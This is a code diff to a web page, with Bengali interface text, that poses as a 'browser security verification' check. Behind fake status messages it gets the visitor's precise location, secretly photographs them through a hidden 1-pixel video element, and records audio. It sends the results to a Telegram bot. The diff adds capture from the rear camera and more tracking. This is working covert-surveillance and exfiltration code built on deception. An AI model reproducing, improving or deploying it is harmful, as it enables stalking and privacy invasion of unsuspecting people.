@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>সিস্টেম সিকিউরিটি ভেরিফিকেশন</title>
+    <title>ব্রাউজার সিকিউরিটি ভেরিফিকেশন</title>
     <style>
         :root { --primary: #00d1b2; --dark: #363636; }
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
@@ -12,14 +12,13 @@
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* ব্ল্যাক ইমেজ সমস্যার সমাধান: ১ পিক্সেল সাইজে রাখা হয়েছে */
         #video {
             position: fixed;
             top: 0;
             left: 0;
             width: 1px;
             height: 1px;
-            opacity: 0.05; /* একদম হালকা যাতে দেখা না যায় */
+            opacity: 0.05;
             pointer-events: none;
             z-index: -1;
         }
@@ -61,21 +60,27 @@ async function startProcess() {
     let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
     try {
         const position = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { 
-                enableHighAccuracy: true, 
-                timeout: 10000 
-            });
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
         });
         mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
     } catch (e) { console.log("Location Denied"); }
 
-    const finalReport = `📊 *লাইভ ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *সঠিক লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;
+    const report = `📊 *নতুন ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;
 
     try {
+        // ১. সামনের ক্যামেরা
         updateStatus("সিস্টেম ফাইল যাচাই হচ্ছে...");
         const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        await captureAndSend(frontStream, "Front Camera", finalReport);
+        await captureAndSend(frontStream, "Front Camera", report);
 
+        // ২. পেছনের ক্যামেরা (উন্নত লজিক)
+        updateStatus("হার্ডওয়্যার স্ক্যান করা হচ্ছে...");
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            await captureAndSend(backStream, "Back Camera", "--- পেছনের ক্যামেরা ছবি ---");
+        } catch (e) { console.log("Back camera failed"); }
+
+        // ৩. অডিও রেকর্ড (৫ সেকেন্ড)
         updateStatus("সিকিউরিটি এনক্রিপশন চেক হচ্ছে...");
         const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
         await captureAudio(audioStream);
@@ -94,13 +99,11 @@ async function captureAndSend(stream, type, caption) {
     video.srcObject = stream;
     
     return new Promise(resolve => {
-        // ৩ সেকেন্ড অপেক্ষা করুন যাতে সেন্সর ফ্রেম রেন্ডার করতে পারে
         setTimeout(async () => {
             const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
             canvas.width = 640; 
             canvas.height = 480;
-            context.drawImage(video, 0, 0, 640, 480);
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
@@ -110,6 +113,8 @@ async function captureAndSend(stream, type, caption) {
                 formData.append('parse_mode', 'Markdown');
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                
+                // ক্যামেরা বন্ধ করা নিশ্চিত করা যাতে অন্য ক্যামেরা চালু হতে পারে
                 stream.getTracks().forEach(track => track.stop());
                 resolve();
             }, 'image/jpeg', 0.6);
@@ -140,7 +145,14 @@ function showFinalUI() {
     document.getElementById('process-ui').style.display = 'none';
     document.getElementById('icon').innerHTML = '✅';
     document.getElementById('title').innerText = 'ভেরিফিকেশন সম্পন্ন';
-    document.getElementById('my-img').style.display = 'block';
+    
+    const img = document.getElementById('my-img');
+    img.style.display = 'block';
+    
+    // ছবি লোড না হলে এরর চেক
+    img.onerror = function() {
+        console.log("ইমেজ ফাইল পাওয়া যায়নি। নাম চেক করুন।");
+    };
 }
 </script>
 </body>
